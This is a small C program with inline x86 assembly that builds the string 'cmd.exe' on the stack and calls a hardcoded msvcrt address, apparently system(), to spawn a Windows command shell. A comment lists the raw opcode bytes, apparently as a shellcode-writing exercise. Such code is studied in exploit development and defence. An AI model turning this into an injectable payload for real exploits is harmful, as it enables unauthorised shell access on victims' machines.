#include <stdio.h>
#include <windows.h>

int main ()
{
    LoadLibrary("msvcrt.dll");
    __asm{
        push ebp    // 55 -
        mov ebp,esp // 8BEC - 
        xor edi,edi // 33FF -
        push edi    // 57 -
        sub esp,04h // 83EC 04
        mov byte ptr [ebp-08h],63h  // C645 F8 63
        mov byte ptr [ebp-07h],6Dh  // C645 F9 6D
        mov byte ptr [ebp-06h],64h  // C645 FA 64
        mov byte ptr [ebp-05h],2Eh  // C645 FB 2E
        mov byte ptr [ebp-04h],65h  // C645 FC 65
        mov byte ptr [ebp-03h],78h  // C645 FD 78
        mov byte ptr [ebp-02h],65h  // C645 FE 65
        lea eax,[ebp-08h]   // 8D45 F8
        push eax            // 50
        mov ebx,0x77c293c7  // BB C793C277
        call ebx            // FFD3
    }
}


/* 
55 - 8B EC - 33 FF - 57 - 83 EC 04 - C6 45 F8 63 - C6 45 F9 6D - C6 45 FA 64 - 
C6 45 FB 2E - C6 45 FC 65 - C6 45 FD 78 - C6 45 FE 65 - 8D 45 F8 - 50 - BB C793C277
- FF D3 
*/
